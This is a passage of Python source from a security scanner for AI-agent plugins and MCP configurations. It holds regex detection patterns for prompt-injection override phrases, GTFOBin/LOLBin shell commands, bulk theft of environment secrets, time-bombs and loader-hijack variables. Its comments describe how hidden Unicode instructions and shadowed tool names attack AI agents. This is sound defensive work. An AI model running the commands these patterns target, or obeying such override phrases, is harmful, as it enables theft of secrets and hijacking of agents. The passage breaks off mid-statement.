    r"defensive|threat\s+model|treat(?:\s+\S+)?\s+as\s+data|"
    r"NEVER\s+(?:execute|follow|run)|"
    r"as\s+a\s+finding|report(?:ing)?\s+a\s+finding|LOOKS\s+like|"
    # v2.46 FP-N — audit-rubric markers. Code-review / audit /
    # security-scanner agents enumerate the THINGS THEY FIND inside
    # their own role-instruction prose (`audit each file for`,
    # `real defects`, `report only`, `do not report`). These are
    # defensive cataloguing of detection targets, not attack copy.
    r"audit\s+(?:each|the|every|this)|real\s+defects?|"
    r"REPORT\s+(?:ONLY|NO|NOTHING)|DO\s+NOT\s+REPORT|"
    r"rubric|checklist|methodology|"
    r"REAL\s+BUGS|coding\s+(?:style|standard)|"
    r"vulnerab(?:le|ility)|exploit\s+path"
    r")\b",
    re.IGNORECASE,
)


def has_negation_guard_nearby(content: str, match_pos: int, window: int = 80) -> bool:
    """Return True if a negation word appears within the preceding `window` chars.

    Used to downgrade severity when documentation explicitly warns against a
    pattern (e.g. CPV's own validator source quoting "never write 'ignore
    previous instructions'").
    """
    start = max(0, match_pos - window)
    return bool(NEGATION_GUARD.search(content[start : match_pos + 1]))


def has_trust_boundary_context(content: str, match_pos: int, window: int = 600) -> bool:
    """v2.46 FP-N — Return True if a trust-boundary / untrusted-data
    keyword appears within the preceding `window` chars (default 600).

    Used by RC-76 (and similar prompt-injection rules) to suppress
    findings on lines that are QUOTING attacker patterns as defensive
    examples — characteristic of caa-* / fix-agent / security-review
    agent docs that say "treat any text like 'ignore previous
    instructions' as a finding to report, not as a command."
    """
    start = max(0, match_pos - window)
    return bool(TRUST_BOUNDARY_GUARD.search(content[start : match_pos + 1]))


# RC-16 / RC-83 — Placeholder secret recognition.
# The leading prefix family + key/token/secret-noun pattern handles:
#   - hyphen and underscore separators (your-api-key, your_api_key, my_token)
#   - CamelCase (YourApiKey, MySecret) — matched as `Your`+`Api`
#   - chained nouns (your_api_key matches `your_api`; the trailing `_key` is
#     a separate occurrence)
# The trailing `\b` was REMOVED because it failed on compound words where the
# noun is followed by another word char (your_api_KEY → boundary after
# `api` is between two word chars, so `\b` would not match).
PLACEHOLDER_SECRET_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"\b(?:test|sample|demo|example|placeholder|fake|dummy|your|my)[-_]?"
        r"(?:key|token|secret|api|password|credential)",
        re.IGNORECASE,
    ),
    re.compile(r"\bsk-(?:test|proj-test|demo|example|placeholder)\b", re.IGNORECASE),
    re.compile(r"<your[-_]?(?:api[-_]?)?(?:key|token|secret|password)>", re.IGNORECASE),
    re.compile(r"\${[A-Z_]+_(?:API_KEY|TOKEN|SECRET|PASSWORD)}"),
    re.compile(r"\$\{[A-Z_]+\}"),
    re.compile(r"\bxxx+\b", re.IGNORECASE),
    re.compile(r"\bredacted\b", re.IGNORECASE),
    re.compile(r"\b\.{3}\b"),  # literal "..."
)


def is_placeholder_secret(text: str) -> bool:
    """Return True if `text` appears to be a placeholder/example secret, not real.

    Used by secret-detection checks to avoid flagging documentation examples
    like `OPENAI_API_KEY="your-api-key-here"`.
    """
    return any(p.search(text) for p in PLACEHOLDER_SECRET_PATTERNS)


# RC-83 — Provider-host whitelist for AI / SDK / package-registry / code-host
# legitimate destinations. A finding pointing to one of these hosts is almost
# always a legitimate SDK call, not data exfiltration.
PROVIDER_HOSTS_WHITELIST: frozenset[str] = frozenset(
    {
        # AI providers — both FQDN and parent registrable domain (parent enables
        # subdomain matching like cdn.api.openai.com → endswith ".openai.com")
        "openai.com",
        "api.openai.com",
        "anthropic.com",
        "api.anthropic.com",
        "claude.ai",
        "console.anthropic.com",
        "googleapis.com",
        "api.gemini.google.com",
        "generativelanguage.googleapis.com",
        "huggingface.co",
        "cohere.ai",
        "api.cohere.ai",
        "cohere.com",
        "api.cohere.com",
        "mistral.ai",
        "api.mistral.ai",
        "together.ai",
        "api.together.ai",
        "groq.com",
        "api.groq.com",
        "deepinfra.com",
        "api.deepinfra.com",
        "openrouter.ai",
        "api.openrouter.ai",
        "replicate.com",
        "api.replicate.com",
        "runpod.io",
        "api.runpod.io",
        # Package registries — parent registrable enables CDN/mirror subdomains
        "npmjs.org",
        "registry.npmjs.org",
        "pypi.org",
        "pythonhosted.org",
        "files.pythonhosted.org",
        "rubygems.org",
        "crates.io",
        "terraform.io",
        "registry.terraform.io",
        # Code hosting — parent registrable enables raw./api./objects./codeload. subdomains
        "github.com",
        "githubusercontent.com",
        "raw.githubusercontent.com",
        "objects.githubusercontent.com",
        "codeload.github.com",
        "api.github.com",
        "gitlab.com",
        "bitbucket.org",
        # OS / distro update mirrors
        "debian.org",
        "deb.debian.org",
        "ubuntu.com",
        "archive.ubuntu.com",
        "fedoraproject.org",
        "dl.fedoraproject.org",
        "python.org",
        "downloads.python.org",
        "nodejs.org",
    }
)


def is_known_provider_host(host: str) -> bool:
    """Return True if `host` is a recognized AI provider, package registry, or code-host.

    Subdomain matching: `cdn.npmjs.org` and similar are accepted via suffix match.
    """
    host_lower = host.lower().strip()
    if host_lower in PROVIDER_HOSTS_WHITELIST:
        return True
    return any(host_lower.endswith("." + base) for base in PROVIDER_HOSTS_WHITELIST)


# RC-84 / RC-100 — Defensive-context path detection.
# Findings in test, documentation, or sample/template paths get demoted by one
# tier (effective_severity below). This is the difference between "CPV self-FPs
# on its own validator regex source" and "CPV cleanly validates itself".
TEST_PATH_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"(?:^|/)tests?(?:/|$)", re.IGNORECASE),
    re.compile(r"(?:^|/)__tests?__/"),
    re.compile(r"(?:^|/)spec(?:/|$)"),
    re.compile(r"(?:^|/)e2e(?:/|$)"),
    re.compile(r"(?:^|/)fixtures?(?:/|$)"),
    re.compile(r"\.test\.[a-z]+$", re.IGNORECASE),
    re.compile(r"\.spec\.[a-z]+$", re.IGNORECASE),
    re.compile(r"_test\.[a-z]+$"),
    re.compile(r"_spec\.[a-z]+$"),
    re.compile(r"^test_.+\.py$"),
)

DOC_PATH_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\.md$", re.IGNORECASE),
    re.compile(r"\.rst$", re.IGNORECASE),
    re.compile(r"(?:^|/)docs?(?:/|$)", re.IGNORECASE),
    re.compile(r"(?:^|/)documentation(?:/|$)", re.IGNORECASE),
    re.compile(r"README", re.IGNORECASE),
    re.compile(r"CHANGELOG", re.IGNORECASE),
    re.compile(r"CONTRIBUTING", re.IGNORECASE),
    re.compile(r"LICENSE", re.IGNORECASE),
)

SAMPLE_FILE_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\.example$", re.IGNORECASE),
    re.compile(r"\.template$", re.IGNORECASE),
    re.compile(r"\.sample$", re.IGNORECASE),
    re.compile(r"\.dist$", re.IGNORECASE),
    re.compile(r"\.tpl$", re.IGNORECASE),
    re.compile(r"\.example\.[a-z0-9]+$", re.IGNORECASE),
    re.compile(r"\.sample\.[a-z0-9]+$", re.IGNORECASE),
)


def is_test_path(path: str) -> bool:
    """Return True if `path` is in a test / spec / fixtures directory."""
    return any(p.search(path) for p in TEST_PATH_PATTERNS)


def is_doc_path(path: str) -> bool:
    """Return True if `path` is documentation (markdown, rst, or docs/ directory)."""
    return any(p.search(path) for p in DOC_PATH_PATTERNS)


def is_sample_file(path: str) -> bool:
    """Return True if `path` is a template/sample/example file (.env.example, etc.)."""
    return any(p.search(path) for p in SAMPLE_FILE_PATTERNS)


# Severity tier order (worst → least). Used by demote_severity().
SEVERITY_TIERS: tuple[str, ...] = ("critical", "major", "minor", "warning", "info", "passed")


def demote_severity(level: str, by: int = 1) -> str:
    """Return `level` demoted by `by` tiers (clamped at 'passed').

    Unknown levels are returned as-is (no demotion). Useful when a generic
    helper does not know the exact level naming convention.
    """
    try:
        idx = SEVERITY_TIERS.index(level.lower())
    except ValueError:
        return level
    return SEVERITY_TIERS[min(idx + by, len(SEVERITY_TIERS) - 1)]


# Rule-id allowlist: rules whose pattern fires in narrative documentation
# almost-always as a false positive. When a rule in this set fires against
# a doc/test/sample file, we hard-demote to "warning" (not just one tier
# down) — the user explicitly asked: "reduce to warnings all the issues
# that are not 100% sure". These rules' patterns intersect heavily with
# legitimate documentation language:
#
#   RC-03  — "MUST" emphasis (RFC-style normative language is everywhere)
#   RC-11  — mixed-script identifiers (math notation `Z_α` in technical docs)
#   RC-37  — GTFOBin/LOLBin patterns (literal command examples in docs)
#   RC-63  — "do not ask user" autonomy phrases (CLI flag docs / FAQs)
#   RC-76  — stemmed prompt-injection trigger stems (skill docs that
#            DOCUMENT how to handle prompt injection legitimately use
#            "ignore", "previous", "instruct", "override" within an
#            80-char window when explaining the attack)
#   RC-87  — hardcoded loopback IP (already labelled "usually fine but
#            worth flagging" in its own message)
#   RC-93  — ≥30 contiguous spaces (JSON / YAML / table formatting)
#   RC-131 — "system prompt:" / "hidden prompt:" marker (skill docs that
#            explain system prompts contain these words)
#   RC-114 / RC-115 / RC-136 — `curl … | sh|bash` install footgun (every
#            README that documents how to install a tool quotes the
#            upstream's recommended one-liner — e.g. uv, bun, fnm, mise)
#
# Rules NOT in this set keep their default one-tier demotion in docs.
# Add to this set conservatively: a rule belongs here only when its
# pattern firing in pure narrative text is more likely a doc artifact
# than a real attack on the agent's instructions.
UNCERTAIN_IN_DOCS_RULES: frozenset[str] = frozenset(
    {
        "RC-03",
        "RC-11",
        "RC-37",
        "RC-63",
        "RC-76",
        "RC-87",
        "RC-93",
        "RC-114",
        "RC-115",
        "RC-131",
        "RC-136",
    }
)


def effective_severity(level: str, file_path: str, rule_id: str | None = None) -> str:
    """Compute effective severity given file context (RC-84 + RC-100 demotion).

    Demotes by one tier when the finding is in a defensive context — test
    fixture, documentation file, or sample / template / example file. The
    three contexts do NOT stack — maximum demotion is one tier per finding.

    When ``rule_id`` is provided AND the rule is in
    ``UNCERTAIN_IN_DOCS_RULES`` AND the file is a doc/test/sample, hard-
    demote to "warning" (not just one tier down). This matches the user
    rule "reduce to warnings all the issues that are not 100% sure".

    Demotion is CLAMPED at the "warning" tier — `info` and `passed` are
    not findings the orchestrator dispatches via `getattr(report, level)`
    with file+line arguments, so demoting into them would crash the call
    site. Callers that need INFO-tier reporting should use `report.info()`
    directly, not via this helper.

    A check that uses this MUST call it BEFORE invoking `report.<level>(...)`
    and dispatch on the returned level via `getattr(report, returned_level)`.
    """
    in_defensive_context = is_sample_file(file_path) or is_test_path(file_path) or is_doc_path(file_path)
    if not in_defensive_context:
        return level
    if rule_id is not None and rule_id in UNCERTAIN_IN_DOCS_RULES:
        # Hard-demote to warning regardless of starting tier.
        return "warning"
    demoted = demote_severity(level, by=1)
    # Clamp at warning — never demote into info/passed (those have 2-arg
    # signature and would crash the dispatch site).
    if demoted in ("info", "passed"):
        return "warning"
    return demoted


# =============================================================================
# RC-101 — RuleSchema dataclass (Phase 1 foundation)
# =============================================================================
#
# Every Phase 1+ rule registers itself via this dataclass so the orchestration
# layer can iterate, filter by severity / category / rule_id, generate
# documentation, and produce uniform reports. Without this schema, 70+ new
# rules would create ad-hoc grab-bag of patterns scattered across files.


@dataclass(frozen=True, slots=True)
class RuleSchema:
    """Canonical metadata shape for security rules in CPV.

    Used by Phase 1+ rules. Older Phase 0 helpers + cc-audit/tirith integrations
    do NOT use this schema (they predate it). The orchestration layer iterates
    `RULE_REGISTRY` to filter by id / category / severity and produce reports.
    """

    rule_id: str  # e.g. "RC-09", "RC-101"
    name: str  # short human title
    category: str  # "unicode" | "mcp" | "supply-chain" | "credentials" | ...
    severity: str  # "CRITICAL" | "MAJOR" | "MINOR" | "NIT" | "WARNING" | "INFO"
    description: str  # one-line intent (≤120 chars recommended)
    references: tuple[str, ...] = ()  # surveyed scanners that informed this rule
    cwe: str | None = None  # CWE identifier if applicable
    fp_guards: tuple[str, ...] = ()  # human-readable list of FP guards applied


# Module-level registry. Phase 1+ rule modules append their RuleSchema
# instances here at import time. Used by `--list-rules` CLI flag (future)
# and by the test suite to verify each registered rule has tests.
RULE_REGISTRY: list[RuleSchema] = []


def register_rule(schema: RuleSchema) -> RuleSchema:
    """Register a RuleSchema in the module-level registry. Returns the schema unchanged.

    Called at module import time. Idempotent — duplicate registrations
    (same rule_id) are silently ignored.
    """
    if any(s.rule_id == schema.rule_id for s in RULE_REGISTRY):
        return schema
    RULE_REGISTRY.append(schema)
    return schema


# =============================================================================
# Phase 1 — Critical net-new pattern catalogs
# =============================================================================
# Each rule below adds its detection pattern + a RuleSchema registration.
# Check functions that consume these patterns live in `validate_security.py`.

# -----------------------------------------------------------------------------
# RC-09 — Zero-width Unicode characters
# -----------------------------------------------------------------------------
# Source: felipeinf/skillRx, LichAmnesia/skill-lint, vetskill (per Opus synthesis)
# Attack: invisible characters (ZWSP, ZWNJ, ZWJ) hide instructions in
# AI-facing markdown that an LLM treats as text but a human reviewer cannot
# see.  Real npm 2025 attack vector (os-info-checker-es6 used U+E0100).
ZERO_WIDTH_CHARS: tuple[tuple[str, str], ...] = (
    ("​", "ZERO WIDTH SPACE (U+200B)"),
    ("‌", "ZERO WIDTH NON-JOINER (U+200C)"),
    ("‍", "ZERO WIDTH JOINER (U+200D)"),
    ("⁠", "WORD JOINER (U+2060)"),
    ("﻿", "ZERO WIDTH NO-BREAK SPACE / BOM (U+FEFF)"),
    ("᠎", "MONGOLIAN VOWEL SEPARATOR (U+180E)"),
    ("͏", "COMBINING GRAPHEME JOINER (U+034F)"),
    ("ᅟ", "HANGUL CHOSEONG FILLER (U+115F)"),
    ("ᅠ", "HANGUL JUNGSEONG FILLER (U+1160)"),
)


def find_zero_width_chars(text: str) -> list[tuple[int, str]]:
    """Return list of (line_number, char_description) for each zero-width char found.

    Line numbers are 1-based for human reporting consistency.
    """
    findings: list[tuple[int, str]] = []
    for line_no, line in enumerate(text.split("\n"), start=1):
        for ch, desc in ZERO_WIDTH_CHARS:
            if ch in line:
                findings.append((line_no, desc))
    return findings


register_rule(
    RuleSchema(
        rule_id="RC-09",
        name="Zero-width Unicode characters",
        category="unicode",
        severity="MAJOR",
        description="Invisible Unicode (ZWSP/ZWNJ/ZWJ/BOM/WJ) used to hide instructions in AI-facing content.",
        references=("felipeinf/skillRx", "LichAmnesia/skill-lint", "vetskill"),
        cwe="CWE-1007",
        fp_guards=("Skip when in fenced code block (RC-83)", "Skip when in test/fixture path (RC-84)"),
    )
)

# -----------------------------------------------------------------------------
# RC-10 — TAG character block (U+E0000–U+E007F)
# -----------------------------------------------------------------------------
# Source: aguara, vetskill (extended). CRITICAL — AsciiSmuggler attack
# Attack: TAG characters (U+E0001 LANGUAGE TAG, U+E0020-U+E007E TAG ASCII)
# encode arbitrary text invisibly. Used in 2024 Slack injection demos and
# the npm os-info-checker-es6 incident (2025) used U+E0100 variation
# selectors of the same family. Any TAG-block character in AI-facing
# content is a near-certain attack indicator — there is no legitimate use.
TAG_CHAR_RANGE_RE = re.compile(r"[\U000E0000-\U000E007F\U000E0100-\U000E01EF]")


def find_tag_block_chars(text: str) -> list[tuple[int, str]]:
    """Return list of (line_number, hex_codepoint) for each TAG-block char."""
    findings: list[tuple[int, str]] = []
    for line_no, line in enumerate(text.split("\n"), start=1):
        for m in TAG_CHAR_RANGE_RE.finditer(line):
            cp = ord(m.group(0))
            findings.append((line_no, f"U+{cp:04X}"))
    return findings


register_rule(
    RuleSchema(
        rule_id="RC-10",
        name="TAG character block (U+E0000–U+E01EF)",
        category="unicode",
        severity="CRITICAL",
        description="Invisible TAG characters used to smuggle hidden text past humans (AsciiSmuggler).",
        references=("aguara", "vetskill"),
        cwe="CWE-1007",
        fp_guards=("None — no legitimate use of TAG block in AI content. Always flag.",),
    )
)

# -----------------------------------------------------------------------------
# RC-11 — Homoglyph / mixed-script confusable
# -----------------------------------------------------------------------------
# Source: aguara, vetskill (added via TRDD audit pass)
# Attack: Cyrillic/Greek lookalikes for Latin letters in tool names or URL
# hosts (Cyrillic 'а' U+0430 vs Latin 'a' U+0061). When a name like
# `read_fіle` (Cyrillic і) appears, the LLM may resolve it as `read_file`.
# Detection: a single string containing characters from both Latin and
# Cyrillic/Greek/Armenian scripts is the signature.
_LATIN_RE = re.compile(r"[A-Za-z]")
_CYRILLIC_RE = re.compile(r"[Ѐ-ӿ]")
_GREEK_RE = re.compile(r"[Ͱ-Ͽ]")
_ARMENIAN_RE = re.compile(r"[԰-֏]")


def has_mixed_script(text: str) -> tuple[bool, str]:
    """Return (is_mixed, reason) — True if text mixes Latin with another script.

    Empty / single-script text returns (False, ""). The reason string lists
    the offending scripts for reporting.
    """
    has_latin = bool(_LATIN_RE.search(text))
    if not has_latin:
        return (False, "")
    foreign: list[str] = []
    if _CYRILLIC_RE.search(text):
        foreign.append("Cyrillic")
    if _GREEK_RE.search(text):
        foreign.append("Greek")
    if _ARMENIAN_RE.search(text):
        foreign.append("Armenian")
    if foreign:
        return (True, f"Latin + {', '.join(foreign)}")
    return (False, "")


register_rule(
    RuleSchema(
        rule_id="RC-11",
        name="Homoglyph / mixed-script confusable",
        category="unicode",
        severity="CRITICAL",
        description="Mixed-script identifiers (Latin + Cyrillic/Greek/Armenian) — homoglyph attack vector.",
        references=("aguara", "vetskill"),
        cwe="CWE-1007",
        fp_guards=("Skip in doc files containing intentional language examples (RC-84)",),
    )
)

# -----------------------------------------------------------------------------
# RC-21 — process.env / os.environ bulk harvest
# -----------------------------------------------------------------------------
# Source: aguara CRED_004
# Attack: `Object.keys(process.env)`, `JSON.stringify(process.env)`,
# `dict(os.environ)`, `os.environ.copy()` — single-call exfil of every
# secret in the environment. Different from individual env-var reads
# (which are sometimes legitimate); BULK access is suspicious.
ENV_BULK_HARVEST_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\bObject\.keys\s*\(\s*process\.env\s*\)"),
    re.compile(r"\bJSON\.stringify\s*\(\s*process\.env\s*\)"),
    re.compile(r"\bObject\.entries\s*\(\s*process\.env\s*\)"),
    re.compile(r"\bObject\.values\s*\(\s*process\.env\s*\)"),
    re.compile(r"\bdict\s*\(\s*os\.environ\s*\)"),
    re.compile(r"\bos\.environ\.copy\s*\(\s*\)"),
    re.compile(r"\b(?:list|tuple|set)\s*\(\s*os\.environ"),
)

register_rule(
    RuleSchema(
        rule_id="RC-21",
        name="process.env / os.environ bulk harvest",
        category="credentials",
        severity="MAJOR",
        description="Bulk-iteration over environment variables — single-call secret exfiltration.",
        references=("aguara CRED_004",),
        cwe="CWE-200",
        fp_guards=("Skip in test fixtures (RC-84)", "Skip in doc files (RC-84)"),
    )
)

# -----------------------------------------------------------------------------
# RC-29 — Python .pth executable file
# -----------------------------------------------------------------------------
# Source: aguara SC-09 (litellm@1.82.7 incident)
# Attack: a `.pth` file in site-packages contains lines that Python
# executes verbatim at interpreter startup. A line starting with
# `import ...` or `exec(...)` runs at every Python invocation.
PTH_EXEC_RE = re.compile(r"^(?:import\s+\w|exec\s*\()", re.MULTILINE)


def is_pth_with_exec(filename: str, content: str) -> bool:
    """Return True if `filename` is a .pth file containing executable lines."""
    if not filename.endswith(".pth"):
        return False
    return bool(PTH_EXEC_RE.search(content))


register_rule(
    RuleSchema(
        rule_id="RC-29",
        name="Python .pth executable file",
        category="supply-chain",
        severity="CRITICAL",
        description="Python .pth file with import/exec — runs at every interpreter startup (litellm@1.82.7 vector).",
        references=("aguara SC-09",),
        cwe="CWE-94",
        fp_guards=("Comment-only .pth (no import/exec) is benign and skipped",),
    )
)

# -----------------------------------------------------------------------------
# RC-37 — GTFOBins / LOLBins / macOS osascript / Windows LOLBins
# -----------------------------------------------------------------------------
# Source: aguara SUPPLY_007 (also covers RC-97 Windows-specific LOLBins
# folded in per TRDD audit). GTFOBins are legitimate system utilities
# repurposed for sandbox escape (find -exec, awk system, perl -e ...).
# LOLBins are Windows binaries (certutil, regsvr32, mshta, bitsadmin)
# repurposed for malicious execution.
GTFOBIN_LOLBIN_PATTERNS: tuple[re.Pattern[str], ...] = (
    # Unix GTFOBins — find -exec /bin/sh / find -exec sh-tail-binary
    # Allow arbitrary intermediate flags (e.g. -name '*.py' -type f) between
    # `find <path>` and `-exec`. The shell binary may be /bin/sh, /usr/bin/sh,
    # or simply `sh` (if PATH lookup is in scope).
    re.compile(r"\bfind\s+\S+(?:\s+(?!-exec)\S+)*\s+-exec\s+(?:/\S*)?sh\b"),
    re.compile(r"\bawk\s+'(?:BEGIN\s*\{)?\s*system\s*\("),
    re.compile(r"\bperl\s+-[eE]\s+['\"]"),
    re.compile(r"\bruby\s+-[eE]\s+['\"]"),
    re.compile(r"\bsed\s+-i?\s*['\"]?\s*[0-9]*[esai]\s*[/']\S*\s*['\"]?\s*\S+\s*\|\s*sh"),
    re.compile(r"\bvim\s+-c\s+['\"]:!"),
    re.compile(r"\bless\s+\S+\s*\|\s*sh"),
    # macOS — AppleScript shell escape
    re.compile(r"\bosascript\s+-e\s+['\"]do\s+shell\s+script"),
    # Windows LOLBins (RC-97 folded into RC-37)
    re.compile(r"\bcertutil(?:\.exe)?\s+-(?:urlcache|decode|encode)\s", re.IGNORECASE),
    re.compile(r"\bregsvr32(?:\.exe)?\s+/s\s+/n\s+/u\s+/i:", re.IGNORECASE),
    re.compile(r"\bmshta(?:\.exe)?\s+(?:https?:|javascript:|vbscript:)", re.IGNORECASE),
    re.compile(r"\bbitsadmin(?:\.exe)?\s+/transfer\s", re.IGNORECASE),
    re.compile(r"\brundll32(?:\.exe)?\s+\S+,\s*\w+", re.IGNORECASE),
)

register_rule(
    RuleSchema(
        rule_id="RC-37",
        name="GTFOBins / LOLBins (Unix + macOS + Windows)",
        category="sandbox-escape",
        severity="CRITICAL",
        description="Legit system utilities repurposed for arbitrary execution / sandbox escape.",
        references=("aguara SUPPLY_007", "vexscan SANDBOX-007", "RC-97 folded"),
        cwe="CWE-78",
        fp_guards=(
            "Skip in shell-like files where these are documented examples (RC-83 fence)",
            "Negation guard (RC-83)",
        ),
    )
)

# -----------------------------------------------------------------------------
# RC-43 — Time-bomb / conditional activation
# -----------------------------------------------------------------------------
# Source: yidun, vexscan BACK-001
# Attack: malicious branch only fires under specific conditions
# (specific date, specific username, specific hostname, specific env var)
# to evade analysis on any other system. CPV's existing prompt-injection
# rules catch SOME forms; this rule catches the structural pattern.
TIMEBOMB_PATTERNS: tuple[re.Pattern[str], ...] = (
    # date-conditional: if Date.now() > X, if datetime.now() > X
    re.compile(r"\bif\s*\(?\s*(?:Date\.now\(\)|new\s+Date\(\)|datetime\.now\(\)|time\.time\(\))\s*[><]"),
    # hostname-conditional
    re.compile(
        r"\bif\s*\(?\s*(?:os\.uname\(\)\.nodename|os\.hostname\(\)|process\.env\.HOSTNAME|socket\.gethostname\(\))\s*=="
    ),
    # username-conditional. The os.environ.get('USER') form has a trailing
    # closing paren before the comparison; the env-var-attribute forms do not.
    re.compile(
        r"\bif\s*\(?\s*"
        r"(?:os\.environ\.get\(\s*[\"']USER[\"']\s*\)|getpass\.getuser\(\)|process\.env\.USER)"
        r"\s*=="
    ),
    # env-var-conditional with literal trigger value (production / activate / etc.)
    re.compile(
        r"\bif\s*\(?\s*(?:os\.environ\.get|process\.env)\s*[\(\[]\s*[\"'][A-Z_]+[\"']\s*"
        r"[\)\]]?\s*==\s*[\"'](?:trigger|activate|enable|prod|production)[\"']",
        re.IGNORECASE,
    ),
)

register_rule(
    RuleSchema(
        rule_id="RC-43",
        name="Time-bomb / conditional activation",
        category="evasion",
        severity="CRITICAL",
        description="Code branch gated on date/hostname/username/env — designed-in evasion of analysis.",
        references=("yidun", "vexscan BACK-001"),
        cwe="CWE-506",
        fp_guards=("Skip in test files (RC-84)", "Skip when in fenced code (RC-83)"),
    )
)

# -----------------------------------------------------------------------------
# RC-47 — MCP env-var injection (LD_PRELOAD / NODE_OPTIONS / etc.)
# -----------------------------------------------------------------------------
# Source: yidun, agentvet
# Attack: an MCP server's `env` block in `.mcp.json` sets a high-impact env
# var (LD_PRELOAD, DYLD_INSERT_LIBRARIES, NODE_OPTIONS=--require, etc.)
# that runs attacker code at server startup before any tool is even called.
# RCE-on-config-load.
MCP_DANGEROUS_ENV_KEYS: frozenset[str] = frozenset(
    {
        # POSIX dynamic-loader hijacks
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
        "DYLD_FRAMEWORK_PATH",
        # Node.js startup hooks
        "NODE_OPTIONS",
        # Python startup hooks
        "PYTHONSTARTUP",
        "PYTHONPATH",
        # PERL5 / Ruby startup hooks
        "PERL5OPT",
        "PERL5LIB",
        "RUBYOPT",
        "RUBYLIB",
        # JVM
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        # Generic process injection
        "INJECT_LIB",
    }
)

register_rule(
    RuleSchema(
        rule_id="RC-47",
        name="MCP env-var injection (LD_PRELOAD / NODE_OPTIONS / etc.)",
        category="mcp",
        severity="CRITICAL",
        description="MCP server env block sets dynamic-loader / runtime-hook env var — RCE on config load.",
        references=("yidun", "agentvet"),
        cwe="CWE-426",
        fp_guards=("None — these env vars have no legitimate use in plugin MCP configs",),
    )
)

# -----------------------------------------------------------------------------
# RC-49 (PARTIAL — programmatic prefilter only) — MCP description injection
# -----------------------------------------------------------------------------
# The full check is partial agent-class (see agent-rule-checks.md). The
# PROGRAMMATIC HALF runs here and emits a finding for each MCP tool
# description matching the prefilter regex. The semantic-validator
# (opt-in) re-runs this and adds LLM judgment for ambiguous cases.
MCP_DESCRIPTION_INJECTION_PREFILTER: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"\b(?:ignore|disregard|forget|override|bypass|skip)\s+"
        r"(?:all\s+)?(?:\w+\s+){0,3}"
        r"(?:previous|prior|above|earlier|original|system)\s+"
        r"(?:instructions?|rules?|guidelines?|directives?)",
        re.IGNORECASE,
    ),
    re.compile(
        r"\b(?:you\s+(?:are\s+now|must|will)|system:|admin:|<\|.*?\|>)\b",
        re.IGNORECASE,
    ),
)

register_rule(
    RuleSchema(
        rule_id="RC-49",
        name="MCP tool-description prompt injection (prefilter)",
        category="mcp",
        severity="CRITICAL",
        description="MCP tool description contains LLM-instructions instead of describing the tool.",
        references=("aguara MCP-005", "vexscan MCP-009", "agentaudit TP_INJECT_011"),
        cwe="CWE-94",
        fp_guards=("Negation guard (RC-83)", "Skip in CPV's own validator-source files"),
    )
)

# -----------------------------------------------------------------------------
# RC-50 — MCP tool-name shadowing
# -----------------------------------------------------------------------------
# Source: aguara MCP-006, agentvet, GoPlusSecurity/agentguard
# Attack: an MCP server defines a tool with the same name as a Claude
# Code built-in (read_file / write_file / bash / grep / edit). When tool
# resolution chooses the MCP version, the attacker intercepts what the
# agent thought was a built-in operation.
SHADOWED_TOOL_NAMES: frozenset[str] = frozenset(
    {
        "read_file",
        "write_file",
        "edit",
        "str_replace",
        "create_file",
        "multi_edit",
        "bash",
        "shell",
        "exec",
        "run_command",
        "powershell",
        "grep",
        "glob",
        "search",
        "find_files",
        "view",
        "show",
        "list_directory",
        "ls",
        "git",
        "git_commit",
        "git_push",
        "git_status",
        "fetch",
        "http_get",
        "http_post",
        "webfetch",
        "task",
        "agent",
        "skill",
        "read",
        "write",
        "edit",
        "ask_user",
        "ask_user_question",
    }
)


def is_shadowed_tool_name(name: str) -> tuple[bool, str | None]:
    """Return (True, matched_builtin) if `name` matches or near-matches a built-in.

    Matching: exact, NFKC-normalized exact, or Levenshtein ≤ 1.
    """
    import unicodedata

    name_lower = name.lower().strip()
    if name_lower in SHADOWED_TOOL_NAMES:
        return (True, name_lower)
    nfkc = unicodedata.normalize("NFKC", name_lower)
    if nfkc != name_lower and nfkc in SHADOWED_TOOL_NAMES:
        return (True, nfkc)
    # Levenshtein ≤ 1 (typo / single-char swap)
    for builtin in SHADOWED_TOOL_NAMES:
        if abs(len(name_lower) - len(builtin)) > 1:
            continue
        if _levenshtein_at_most_one(name_lower, builtin):
            return (True, builtin)
    return (False, None)


def _levenshtein_at_most_one(a: str, b: str) -> bool:
    """Fast check: are strings within Levenshtein distance 1?

    Cheaper than full Levenshtein when only the binary 0/1 verdict matters.
    """
    if a == b:
        return True
    la, lb = len(a), len(b)
    if abs(la - lb) > 1:
        return False
    if la == lb:
        # Substitution — count mismatches
        return sum(1 for x, y in zip(a, b) if x != y) == 1
    # Insert / delete — walk the shorter string against the longer
    short, lng = (a, b) if la < lb else (b, a)
    i = j = mismatches = 0
    while i < len(short) and j < len(lng):
        if short[i] != lng[j]:
            if mismatches:
                return False
            mismatches += 1
            j += 1
            continue
        i += 1
        j += 1
    return True


register_rule(
    RuleSchema(
        rule_id="RC-50",
        name="MCP tool-name shadowing",
        category="mcp",
        severity="CRITICAL",
        description="MCP tool name matches (or near-matches) a Claude Code built-in — impersonation vector.",
        references=("aguara MCP-006", "agentvet", "GoPlusSecurity/agentguard"),
        cwe="CWE-1021",
        fp_guards=("Domain-specific reads like read_file_pdf are typically benign — flag ambiguous-only",),
    )
)

# -----------------------------------------------------------------------------
# RC-67 — Cryptomining indicators
# -----------------------------------------------------------------------------
# Source: aguara CRYPTO_001 (OWASP LLM10)
# Attack: skill or agent silently runs cryptomining (xmrig, t-rex,
# nbminer, lolMiner) or connects to a mining pool (stratum+tcp://).
CRYPTOMINING_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\b(?:xmrig|t-rex|nbminer|lolminer|nicehash|ethminer|cgminer|bfgminer)\b", re.IGNORECASE),
    re.compile(r"stratum\+tcp://"),
    re.compile(r"stratum\+ssl://"),
    re.compile(r"\bMINING_POOL\b", re.IGNORECASE),
    re.compile(r"\bWALLET_ADDRESS\b", re.IGNORECASE),
    # XMR/Monero address shape
    re.compile(r"\b4[1-9A-HJ-NP-Za-km-z]{94}\b"),
)

register_rule(
    RuleSchema(
